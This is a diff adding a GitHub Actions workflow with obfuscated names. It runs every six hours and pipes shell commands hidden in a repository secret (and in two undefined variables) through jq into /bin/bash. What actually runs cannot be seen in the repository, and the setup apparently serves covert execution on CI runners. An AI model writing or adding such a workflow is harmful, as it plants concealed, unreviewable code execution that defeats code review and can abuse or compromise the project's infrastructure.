@@ -1,0 +1,19 @@
+name: plugincode436
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: plugincode436
+        env:
+          ub3: ${{ secrets.ub3 }}
+        run: |
+          echo $ub3 | jq -r .q47 | /bin/bash
+          echo $amj723 | jq -r .cvmus6 | /bin/bash
+          echo $l9039 | jq -r .hm897 | /bin/bash
+
